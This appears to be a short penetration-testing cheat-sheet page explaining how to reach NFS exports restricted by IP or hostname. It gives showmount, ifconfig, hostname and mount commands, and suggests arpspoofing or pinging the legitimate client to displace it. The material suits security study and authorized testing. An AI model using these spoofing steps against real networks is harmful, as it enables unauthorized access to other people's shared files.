<title>Spoof For Access</title>
</head><body>If you showmount -e &lt;ip&gt; you can see exports and what users are allowed to access those exports<br/>
These are typically filtered based on IP address and sometimes on hostname<br/>
<br/>
You can exploit this configuration by spoofing your ip address / hostname and then attempting to connect<br/>
<br/>
ifconfig &lt;interface&gt; &lt;spoof_IP&gt;<br/>
echo &lt;hostname&gt; &gt; /etc/hostname<br/>
	#If changing hostname, make sure to reboot your machine<br/>
<br/>
Now try to mount the nfs export<br/>
mount -o nolock,&lt;options&gt; IP:/export/path /mnt/&lt;path&gt;<br/>
<br/>
You may want to try to ping the target continually or arpspoof the target machine in order to successfully mount the export<br/>
This is because the actual client may be online and actively using the share (or just the IP is in use). </body></html>
